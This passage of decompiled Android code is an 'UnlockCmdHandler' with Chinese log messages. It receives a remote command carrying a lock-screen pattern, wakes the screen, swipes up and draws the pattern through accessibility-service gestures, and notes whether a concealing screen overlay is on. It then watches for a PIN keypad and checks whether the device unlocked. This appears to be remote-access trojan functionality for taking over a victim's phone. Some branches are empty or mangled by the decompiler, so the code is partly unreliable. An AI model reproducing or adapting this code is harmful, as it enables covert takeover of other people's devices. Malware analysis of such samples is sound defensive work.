            if (i2 == 0) {
                kg1.m213544f4(obj);
                t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 收到图案解锁命令");
                JSONObject jSONObjectOptJSONObject = jSONObject != null ? jSONObject.optJSONObject("data") : null;
                if (jSONObjectOptJSONObject == null || (jSONArrayOptJSONArray = jSONObjectOptJSONObject.optJSONArray("pattern")) == null) {
                    jSONArrayOptJSONArray = jSONObject != null ? jSONObject.optJSONArray("pattern") : null;
                }
                if (jSONArrayOptJSONArray == null || jSONArrayOptJSONArray.length() < 4) {
                    t60.m214726f4("UnlockCmdHandler", "[UNLOCK_DEVICE] 图案解锁参数无效: patternArray=" + jSONArrayOptJSONArray + ", length=" + (jSONArrayOptJSONArray != null ? jSONArrayOptJSONArray.length() : 0));
                    return c1351vv;
                }
                ArrayList arrayList = new ArrayList();
                int length = jSONArrayOptJSONArray.length();
                for (int i3 = 0; i3 < length; i3++) {
                    int iOptInt = jSONArrayOptJSONArray.optInt(i3);
                    arrayList.add(new Integer(iOptInt));
                    t60.m214702c3("UnlockCmdHandler", "[UNLOCK_DEVICE] 图案点[" + i3 + "]: " + iOptInt);
                }
                strM213295i2 = AbstractC0715je.m213295i2(arrayList, ",", null, null, null, 62);
                t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 完整图案: " + strM213295i2 + " (" + arrayList.size() + "个点, 格式:0-8逗号分隔)");
                fd0 fd0VarM214868a4 = uz0Var2.m214868a4();
                t60.m214702c3("UnlockCmdHandler", "[UNLOCK_DEVICE] 遮罩启用: " + (fd0VarM214868a4 != null && fd0VarM214868a4.m212793a1()));
                t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 步骤1: 唤醒屏幕");
                uz0Var2.f60536a0.m211536n5();
                unlockCommandHandler$handleUnlockDevice$1.f53576a0 = uz0Var2;
                unlockCommandHandler$handleUnlockDevice$1.f53577a1 = strM213295i2;
                unlockCommandHandler$handleUnlockDevice$1.f53580a4 = 1;
                if (b81.m210571b1(1000L, unlockCommandHandler$handleUnlockDevice$1) == coroutineSingletons) {
                }
            }
            if (i2 != 1) {
                if (i2 != 2) {
                    if (i2 != 3) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kg1.m213544f4(obj);
                    return c1351vv;
                }
                strM213295i2 = unlockCommandHandler$handleUnlockDevice$1.f53577a1;
                uz0Var2 = unlockCommandHandler$handleUnlockDevice$1.f53576a0;
                kg1.m213544f4(obj);
                t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 步骤3: 开始绘制图案");
                String string = strM213295i2.toString();
                unlockCommandHandler$handleUnlockDevice$1.f53576a0 = null;
                unlockCommandHandler$handleUnlockDevice$1.f53577a1 = null;
                unlockCommandHandler$handleUnlockDevice$1.f53580a4 = 3;
                objM211461f0 = uz0Var2.f60536a0.m211461f0(string, unlockCommandHandler$handleUnlockDevice$1);
                if (objM211461f0 == CoroutineSingletons.f57606a0) {
                    objM211461f0 = c1351vv;
                }
                return objM211461f0 != coroutineSingletons ? coroutineSingletons : c1351vv;
            }
            strM213295i2 = unlockCommandHandler$handleUnlockDevice$1.f53577a1;
            uz0Var2 = unlockCommandHandler$handleUnlockDevice$1.f53576a0;
            kg1.m213544f4(obj);
            t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 步骤2: 执行上滑解锁手势");
            uz0Var2.m214877b3();
            unlockCommandHandler$handleUnlockDevice$1.f53576a0 = uz0Var2;
            unlockCommandHandler$handleUnlockDevice$1.f53577a1 = strM213295i2;
            unlockCommandHandler$handleUnlockDevice$1.f53580a4 = 2;
            if (b81.m210571b1(1500L, unlockCommandHandler$handleUnlockDevice$1) != coroutineSingletons) {
                t60.m214714d6("UnlockCmdHandler", "[UNLOCK_DEVICE] 步骤3: 开始绘制图案");
                String string2 = strM213295i2.toString();
                unlockCommandHandler$handleUnlockDevice$1.f53576a0 = null;
                unlockCommandHandler$handleUnlockDevice$1.f53577a1 = null;
                unlockCommandHandler$handleUnlockDevice$1.f53580a4 = 3;
                objM211461f0 = uz0Var2.f60536a0.m211461f0(string2, unlockCommandHandler$handleUnlockDevice$1);
                if (objM211461f0 == CoroutineSingletons.f57606a0) {
                }
                if (objM211461f0 != coroutineSingletons) {
                }
            }
        } catch (Exception e) {
            t60.m214705c6("UnlockCmdHandler", "[UNLOCK_DEVICE] 图案解锁失败", e);
            return c1351vv;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: b1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211893b1(uz0 uz0Var, long j, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$waitForNumericKeypad$1 unlockCommandHandler$waitForNumericKeypad$1;
        C0352a9 c0352a9;
        uz0 uz0Var2;
        C0352a9 c0352a92;
        long jCurrentTimeMillis;
        long j2;
        if (continuationImpl instanceof UnlockCommandHandler$waitForNumericKeypad$1) {
            unlockCommandHandler$waitForNumericKeypad$1 = (UnlockCommandHandler$waitForNumericKeypad$1) continuationImpl;
            int i = unlockCommandHandler$waitForNumericKeypad$1.f53587a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                unlockCommandHandler$waitForNumericKeypad$1.f53587a6 = i - Integer.MIN_VALUE;
                c0352a9 = this;
            } else {
                c0352a9 = this;
                unlockCommandHandler$waitForNumericKeypad$1 = new UnlockCommandHandler$waitForNumericKeypad$1(c0352a9, continuationImpl);
            }
        }
        Object obj = unlockCommandHandler$waitForNumericKeypad$1.f53585a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = unlockCommandHandler$waitForNumericKeypad$1.f53587a6;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            uz0Var2 = uz0Var;
            c0352a92 = c0352a9;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j3 = unlockCommandHandler$waitForNumericKeypad$1.f53584a3;
            long j4 = unlockCommandHandler$waitForNumericKeypad$1.f53583a2;
            uz0 uz0Var3 = unlockCommandHandler$waitForNumericKeypad$1.f53582a1;
            c0352a92 = unlockCommandHandler$waitForNumericKeypad$1.f53581a0;
            kg1.m213544f4(obj);
            jCurrentTimeMillis = j3;
            j2 = j4;
            uz0Var2 = uz0Var3;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            c0352a92.getClass();
            try {
                AccessibilityNodeInfo rootInActiveWindow = uz0Var2.f60536a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    int i3 = 0;
                    int i4 = 0;
                    for (int i5 = 0; i5 < 10; i5++) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(String.valueOf(i5));
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            i4++;
                        }
                    }
                    if (i4 >= 5) {
                        t60.m214702c3("UnlockCmdHandler", "[键盘检测] 找到" + i4 + "个数字按钮");
                    } else {
                        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55773c3, dh0.f55772c2), dh0.f55779c9);
                        int size = arrayListM213298i5.size();
                        while (i3 < size) {
                            Object obj2 = arrayListM213298i5.get(i3);
                            i3++;
                            String str = (String) obj2;
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                t60.m214702c3("UnlockCmdHandler", "[键盘检测] 找到关键词: " + str);
                            }
                        }
                    }
                    return Boolean.TRUE;
                }
            } catch (Exception unused) {
            }
            unlockCommandHandler$waitForNumericKeypad$1.f53581a0 = c0352a92;
            unlockCommandHandler$waitForNumericKeypad$1.f53582a1 = uz0Var2;
            unlockCommandHandler$waitForNumericKeypad$1.f53583a2 = j2;
            unlockCommandHandler$waitForNumericKeypad$1.f53584a3 = jCurrentTimeMillis;
            unlockCommandHandler$waitForNumericKeypad$1.f53587a6 = 1;
            if (b81.m210571b1(200L, unlockCommandHandler$waitForNumericKeypad$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211894b2(uz0 uz0Var, long j, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$waitForUnlockResult$1 unlockCommandHandler$waitForUnlockResult$1;
        uz0 uz0Var2;
        long jCurrentTimeMillis;
        long j2;
        if (continuationImpl instanceof UnlockCommandHandler$waitForUnlockResult$1) {
            unlockCommandHandler$waitForUnlockResult$1 = (UnlockCommandHandler$waitForUnlockResult$1) continuationImpl;
            int i = unlockCommandHandler$waitForUnlockResult$1.f53593a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                unlockCommandHandler$waitForUnlockResult$1.f53593a5 = i - Integer.MIN_VALUE;
            } else {
                unlockCommandHandler$waitForUnlockResult$1 = new UnlockCommandHandler$waitForUnlockResult$1(this, continuationImpl);
            }
        }
        Object obj = unlockCommandHandler$waitForUnlockResult$1.f53591a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = unlockCommandHandler$waitForUnlockResult$1.f53593a5;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            uz0Var2 = uz0Var;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            jCurrentTimeMillis = unlockCommandHandler$waitForUnlockResult$1.f53590a2;
            j2 = unlockCommandHandler$waitForUnlockResult$1.f53589a1;
            uz0Var2 = unlockCommandHandler$waitForUnlockResult$1.f53588a0;
            kg1.m213544f4(obj);
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            Object systemService = uz0Var2.f60536a0.getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            if (!(keyguardManager != null ? keyguardManager.isKeyguardLocked() : true)) {
                return Boolean.TRUE;
            }
            unlockCommandHandler$waitForUnlockResult$1.f53588a0 = uz0Var2;
            unlockCommandHandler$waitForUnlockResult$1.f53589a1 = j2;
            unlockCommandHandler$waitForUnlockResult$1.f53590a2 = jCurrentTimeMillis;
            unlockCommandHandler$waitForUnlockResult$1.f53593a5 = 1;
            if (b81.m210571b1(200L, unlockCommandHandler$waitForUnlockResult$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }
}
